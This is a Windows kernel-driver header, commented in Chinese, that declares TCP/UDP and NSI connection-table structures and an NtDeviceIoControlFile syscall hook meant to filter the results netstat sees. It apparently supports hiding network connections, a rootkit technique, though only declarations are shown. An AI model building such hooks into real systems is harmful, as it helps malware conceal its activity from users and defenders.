#pragma once
#include <ntddk.h>
#include "filter.h"

// ============================================================================
// IOCTL 代码定义
// ============================================================================

// TCP 设备 IOCTL
#define IOCTL_TCP_QUERY_INFORMATION_EX  0x00120003

// NSI (Network Store Interface) IOCTL - Windows Vista+ netstat 使用
#define IOCTL_NSI_GETALLPARAM           0x0012001B

// ============================================================================
// 网络连接表结构 (用于 GetExtendedTcpTable/GetExtendedUdpTable)
// ============================================================================

// TCP 连接状态
typedef enum _MIB_TCP_STATE {
    MIB_TCP_STATE_CLOSED = 1,
    MIB_TCP_STATE_LISTEN = 2,
    MIB_TCP_STATE_SYN_SENT = 3,
    MIB_TCP_STATE_SYN_RCVD = 4,
    MIB_TCP_STATE_ESTAB = 5,
    MIB_TCP_STATE_FIN_WAIT1 = 6,
    MIB_TCP_STATE_FIN_WAIT2 = 7,
    MIB_TCP_STATE_CLOSE_WAIT = 8,
    MIB_TCP_STATE_CLOSING = 9,
    MIB_TCP_STATE_LAST_ACK = 10,
    MIB_TCP_STATE_TIME_WAIT = 11,
    MIB_TCP_STATE_DELETE_TCB = 12
} MIB_TCP_STATE;

// MIB_TCPROW_OWNER_PID 结构 (IPv4)
typedef struct _MIB_TCPROW_OWNER_PID {
    ULONG dwState;
    ULONG dwLocalAddr;      // 网络字节序
    ULONG dwLocalPort;      // 网络字节序 (仅高16位有效)
    ULONG dwRemoteAddr;     // 网络字节序
    ULONG dwRemotePort;     // 网络字节序 (仅高16位有效)
    ULONG dwOwningPid;
} MIB_TCPROW_OWNER_PID, *PMIB_TCPROW_OWNER_PID;

// MIB_TCPTABLE_OWNER_PID 结构
typedef struct _MIB_TCPTABLE_OWNER_PID {
    ULONG dwNumEntries;
    MIB_TCPROW_OWNER_PID table[1];  // 可变长数组
} MIB_TCPTABLE_OWNER_PID, *PMIB_TCPTABLE_OWNER_PID;

// MIB_UDPROW_OWNER_PID 结构 (IPv4)
typedef struct _MIB_UDPROW_OWNER_PID {
    ULONG dwLocalAddr;      // 网络字节序
    ULONG dwLocalPort;      // 网络字节序 (仅高16位有效)
    ULONG dwOwningPid;
} MIB_UDPROW_OWNER_PID, *PMIB_UDPROW_OWNER_PID;

// MIB_UDPTABLE_OWNER_PID 结构
typedef struct _MIB_UDPTABLE_OWNER_PID {
    ULONG dwNumEntries;
    MIB_UDPROW_OWNER_PID table[1];
} MIB_UDPTABLE_OWNER_PID, *PMIB_UDPTABLE_OWNER_PID;

// ============================================================================
// IPv6 结构
// ============================================================================

// MIB_TCP6ROW_OWNER_PID 结构 (IPv6)
typedef struct _MIB_TCP6ROW_OWNER_PID {
    UCHAR ucLocalAddr[16];
    ULONG dwLocalScopeId;
    ULONG dwLocalPort;
    UCHAR ucRemoteAddr[16];
    ULONG dwRemoteScopeId;
    ULONG dwRemotePort;
    ULONG dwState;
    ULONG dwOwningPid;
} MIB_TCP6ROW_OWNER_PID, *PMIB_TCP6ROW_OWNER_PID;

typedef struct _MIB_TCP6TABLE_OWNER_PID {
    ULONG dwNumEntries;
    MIB_TCP6ROW_OWNER_PID table[1];
} MIB_TCP6TABLE_OWNER_PID, *PMIB_TCP6TABLE_OWNER_PID;

// MIB_UDP6ROW_OWNER_PID 结构 (IPv6)
typedef struct _MIB_UDP6ROW_OWNER_PID {
    UCHAR ucLocalAddr[16];
    ULONG dwLocalScopeId;
    ULONG dwLocalPort;
    ULONG dwOwningPid;
} MIB_UDP6ROW_OWNER_PID, *PMIB_UDP6ROW_OWNER_PID;

typedef struct _MIB_UDP6TABLE_OWNER_PID {
    ULONG dwNumEntries;
    MIB_UDP6ROW_OWNER_PID table[1];
} MIB_UDP6TABLE_OWNER_PID, *PMIB_UDP6TABLE_OWNER_PID;

// ============================================================================
// NSI 结构 (Windows Vista+ netstat 使用)
// ============================================================================

// NSI TCP 连接条目
typedef struct _NSI_TCP_ENTRY {
    UCHAR   LocalAddr[16];      // IPv4: 前4字节, IPv6: 全部16字节
    ULONG   LocalScopeId;
    ULONG   LocalPort;
    UCHAR   RemoteAddr[16];
    ULONG   RemoteScopeId;
    ULONG   RemotePort;
} NSI_TCP_ENTRY, *PNSI_TCP_ENTRY;

// NSI TCP 状态条目
typedef struct _NSI_TCP_STATUS {
    ULONG   State;
    ULONG   Unknown1[3];
} NSI_TCP_STATUS, *PNSI_TCP_STATUS;

// NSI TCP 进程条目
typedef struct _NSI_TCP_PROCESS {
    ULONG   Unknown1[2];
    ULONG   Pid;
    ULONG   Unknown2;
    ULONG64 CreateTimestamp;
    ULONG64 OwningModuleInfo[16];
} NSI_TCP_PROCESS, *PNSI_TCP_PROCESS;

// NSI UDP 条目
typedef struct _NSI_UDP_ENTRY {
    UCHAR   LocalAddr[16];
    ULONG   LocalScopeId;
    ULONG   LocalPort;
} NSI_UDP_ENTRY, *PNSI_UDP_ENTRY;

// NSI 参数结构
typedef struct _NSI_PARAM {
    ULONG64     Unknown1;
    ULONG64     Unknown2;
    PVOID       ModuleId;
    ULONG       Type;
    ULONG       Unknown3;
    ULONG       Unknown4;
    ULONG       Unknown5;
    PVOID       Entries;
    ULONG       EntrySize;
    PVOID       StatusEntries;
    ULONG       StatusEntrySize;
    PVOID       ProcessEntries;
    ULONG       ProcessEntrySize;
    ULONG       Count;
} NSI_PARAM, *PNSI_PARAM;

// ============================================================================
// 系统调用号定义 (Windows 10/11 x64)
// 注意: 不同版本可能不同，需要动态获取
// ============================================================================
#define SYSCALL_NtDeviceIoControlFile   0x07

// ============================================================================
// 函数声明
// ============================================================================

// 初始化 IOCTL Hook
NTSTATUS IoctlHookInitialize();

// 清理 IOCTL Hook
VOID IoctlHookCleanup();

// 处理 NtDeviceIoControlFile 系统调用
// 在 syscall exit 时调用，用于过滤返回结果
VOID HandleDeviceIoControlExit(
    HANDLE FileHandle,
    ULONG IoControlCode,
    PVOID OutputBuffer,
    ULONG OutputBufferLength,
    PIO_STATUS_BLOCK IoStatusBlock
);

// 过滤 TCP 表
VOID FilterTcpTable(PVOID Buffer, ULONG Length);

// 过滤 UDP 表  
VOID FilterUdpTable(PVOID Buffer, ULONG Length);

// 过滤 NSI TCP 结果
VOID FilterNsiTcpResult(PNSI_PARAM NsiParam);

// 过滤 NSI UDP 结果
VOID FilterNsiUdpResult(PNSI_PARAM NsiParam);

// 检查文件句柄是否是 NSI 设备
BOOLEAN IsNsiDevice(HANDLE FileHandle);

// 获取 NSI 设备对象
PDEVICE_OBJECT GetNsiDeviceObject();
